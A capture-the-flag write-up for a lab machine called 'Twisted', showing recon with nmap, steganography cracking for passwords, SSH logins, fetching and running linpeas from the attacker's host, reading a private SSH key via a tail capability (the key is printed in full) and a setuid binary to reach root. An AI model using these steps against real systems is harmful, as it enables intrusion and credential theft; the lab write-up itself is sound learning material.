@@ -1,0 +1,266 @@
+---------- Twisted Writeup ----------
+
+
+---> arp-scan
+    - We used arp-scan -l | grep "PCS" for scaning.
+    - Ip adress is (10.0.2.50)
+
+
+---> nmap 
+      ─(root㉿kali)-[*]
+      └─# nmap -sV -sC -p- -A -T4 10.0.2.50
+      Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 12:51 EDT
+      Nmap scan report for 10.0.2.50
+      Host is up (0.00071s latency).
+      Not shown: 65533 closed tcp ports (reset)
+      PORT     STATE SERVICE VERSION
+      80/tcp   open  http    nginx 1.14.2
+      |_http-title: Site doesn't have a title (text/html).
+      |_http-server-header: nginx/1.14.2
+      2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+      | ssh-hostkey: 
+      |   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)
+      |   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)
+      |_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)
+      MAC Address: 08:00:27:AA:CE:EF (Oracle VirtualBox virtual NIC)
+      Device type: general purpose
+      Running: Linux 4.X|5.X
+      OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+      OS details: Linux 4.15 - 5.8
+      Network Distance: 1 hop
+      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+      TRACEROUTE
+      HOP RTT     ADDRESS
+      1   0.71 ms 10.0.2.50
+
+      OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+      Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
+
+    - 80/tcp open http
+    - 2222/tcp open  ssh | Don't forget that the ssh port is 2222.
+
+
+---> curl 
+    - Invastigateing the website. 
+      
+      ─(root㉿kali)-[*]
+      └─# curl http://10.0.2.50             
+      <h1>I love cats!</h1> 
+      <img src="cat-original.jpg" alt="Cat original"  width="400" height="400"> 
+      <br>
+      <h1>But I prefer this one because seems different</h1>
+      <img src="cat-hidden.jpg" alt="Cat Hidden" width="400" height="400"> 
+
+    - There is a two different cat images let's downoad those and investigare furter more.
+
+
+---> wget 
+      ─(root㉿kali)-[*]
+      └─# wget http://10.0.2.50/cat-hidden.jpg                             
+      --2024-05-21 12:52:55--  http://10.0.2.50/cat-hidden.jpg
+      Connecting to 10.0.2.50:80... connected.
+      HTTP request sent, awaiting response... 200 OK
+      Length: 288706 (282K) [image/jpeg]
+      Saving to: ‘cat-hidden.jpg’
+
+      cat-hidden.jpg               100%[============================================>] 281.94K  --.-KB/s    in 0.005s  
+
+      2024-05-21 12:52:55 (50.2 MB/s) - ‘cat-hidden.jpg’ saved [288706/288706]
+     
+      ─(root㉿kali)-[*]
+      └─# wget http://10.0.2.50/cat-original.jpg
+      --2024-05-21 12:57:22--  http://10.0.2.50/cat-original.jpg
+      Connecting to 10.0.2.50:80... connected.
+      HTTP request sent, awaiting response... 200 OK
+      Length: 288693 (282K) [image/jpeg]
+      Saving to: ‘cat-original.jpg’
+
+      cat-original.jpg             100%[============================================>] 281.93K  --.-KB/s    in 0.005s  
+
+      2024-05-21 12:57:22 (53.1 MB/s) - ‘cat-original.jpg’ saved [288693/288693]
+
+    - We can use stegseek for the jpg files.
+
+
+---> stegseek
+      ─(root㉿kali)-[*]
+      └─# stegseek cat-original.jpg     
+      StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+      [i] Found passphrase: "westlife"
+      [i] Original filename: "markus.txt".
+      [i] Extracting to "cat-original.jpg.out".
+
+      ─(root㉿kali)-[*]
+      └─# stegseek cat-hidden.jpg                
+      StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+      [i] Found passphrase: "sexymama"
+      [i] Original filename: "mateo.txt".
+      [i] Extracting to "cat-hidden.jpg.out".
+
+    - In .out files we got those:
+    - cat cat-hidden.jpg.out:      thisismypassword --> password for user:  mateo
+    - cat cat-original.jpg.out:    markuslovesbonita --> password for user: markus
+
+
+---> ssh logins and Privilege Escalation
+      ─(root㉿kali)-[*]
+      └─# ssh -p 2222 mateo@10.0.2.50
+      mateo@10.0.2.50's password: 
+      Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+      The programs included with the Debian GNU/Linux system are free software;
+      the exact distribution terms for each program are described in the
+      individual files in /usr/share/doc/*/copyright.
+
+      Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+      permitted by applicable law.
+      Last login: Wed Oct 14 03:21:44 2020 from 192.168.1.58
+mateo@twisted:~$ ls -la 
+      total 36
+      drwxr-xr-x 3 mateo mateo 4096 Oct 14  2020 .
+      drwxr-xr-x 5 root  root  4096 Oct 14  2020 ..
+      -rw------- 1 mateo mateo    5 Oct 14  2020 .bash_history
+      -rw-r--r-- 1 mateo mateo  220 Oct 13  2020 .bash_logout
+      -rw-r--r-- 1 mateo mateo 3526 Oct 13  2020 .bashrc
+      drwxr-xr-x 3 mateo mateo 4096 Oct 14  2020 .local
+      -rw------- 1 mateo mateo   25 Oct 14  2020 note.txt
+      -rw-r--r-- 1 mateo mateo  807 Oct 13  2020 .profile
+      -rw------- 1 mateo mateo   53 Oct 14  2020 .Xauthority
+mateo@twisted:~$ whoami;id;hostname
+      mateo
+      uid=1000(mateo) gid=1000(mateo) groups=1000(mateo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+      twisted
+mateo@twisted:~$ cat note.txt
+      /var/www/html/gogogo.wav
+
+    - Use wget http://10.0.2.50/gogogo.wav to get this fite to your machine.
+    - I downloaded the gogogo.wav file for investigate (https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
+    - You can use this site for audio decodeing.
+    - I found this --> G O D E E P E R . . C O M E W I T H M E . . . L I T T L E R A B B İ T . . 
+    - Than ı decided to login as marcus.
+
+mateo@twisted:~$ su markus 
+      Password: 
+markus@twisted:/home/mateo$ cd /tmp 
+markus@twisted:/tmp$ wget http://10.0.2.24:8000/linpeas.sh --> from your local machin open a server (python3 -m localhost)
+      --2024-05-21 13:15:39--  http://10.0.2.24:8000/linpeas.sh
+      Connecting to 10.0.2.24:8000... connected.
+      HTTP request sent, awaiting response... 200 OK
+      Length: 332111 (324K) [text/x-sh]
+      Saving to: ‘linpeas.sh’
+
+      linpeas.sh                   100%[============================================>] 324.33K  --.-KB/s    in 0.02s   
+
+      2024-05-21 13:15:39 (14.2 MB/s) - ‘linpeas.sh’ saved [332111/332111]
+
+markus@twisted:/tmp$ chmod +x linpeas.sh
+markus@twisted:/tmp$ ./linpeas.sh --> I highly recommed linpeas.sh for exploring 
+
+                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                   ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+            ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+        ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+        ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+        ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+        ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+        ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+        ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+        ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+        ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+        ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+        ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+        ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+        ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+              ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
+                   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          linpeas v3.1.5 - Safe OSCP by carlospolop
+
+      ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Files with capabilities:
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/tail = cap_dac_read_search+ep --> Check this (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search)
+                                          - A little bit of search ı found the exploitation of this.
+
+markus@twisted:/tmp$ tail -n 99999 /var/cache/apt/id_rsa | tee id_rsa 
+      -----BEGIN OPENSSH PRIVATE KEY-----
+      b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+      NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
+      FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
+      olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
+      vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
+      gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
+      tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
+      gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
+      xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
+      DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
+      uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
+      XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
+      U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
+      mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
+      hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
+      nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
+      mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
+      bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
+      yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
+      UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
+      V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
+      LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
+      a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
+      eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
+      D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
+
+    - I got this to my computer and gave permission with chmod, lets move further.
+
+      ─(root㉿kali)-[*]
+      └─# ssh -p 2222 bonita@10.0.2.50 -i id_rsa 
+      Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+      The programs included with the Debian GNU/Linux system are free software;
+      the exact distribution terms for each program are described in the
+      individual files in /usr/share/doc/*/copyright.
+
+      Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+      permitted by applicable law.
+bonita@twisted:~$ ls -la 
+      total 52
+      drwxr-xr-x 4 bonita bonita  4096 Oct 14  2020 .
+      drwxr-xr-x 5 root   root    4096 Oct 14  2020 ..
+      -rw-r--r-- 1 bonita bonita   220 Oct 14  2020 .bash_logout
+      -rw-r--r-- 1 bonita bonita  3526 Oct 14  2020 .bashrc
+      -rwsrws--- 1 root   bonita 16864 Oct 14  2020 beroot --> Noticed it ?
+      drwxr-xr-x 3 bonita bonita  4096 Oct 14  2020 .local
+      -rw-r--r-- 1 bonita bonita   807 Oct 14  2020 .profile
+      drwx------ 2 bonita bonita  4096 Oct 14  2020 .ssh
+      -rw------- 1 bonita bonita    12 Oct 14  2020 user.txt
+bonita@twisted:~$ cat user.txt
+     ************* --> Here is your user flag congrats!!
+bonita@twisted:~$ ./beroot 
+      Enter the code:
+ 
+    >What is the code 
+
+      WRONG
+                                                                                   HEX      DECIMAL
+    - After I decided to analize the source code and I found 4 digit password -->  0x16f8 : 5880
+
+bonita@twisted:~$ ./beroot 
+      Enter the code:
+     5880
+root@twisted:~# whoami;id;hostname
+      root
+      uid=0(root) gid=0(root) groups=0(root),1002(bonita)
+      twisted
+root@twisted:~# cd /root 
+root@twisted:/root# cat root.txt
+      ************ --> Here is your root flag congrats!!
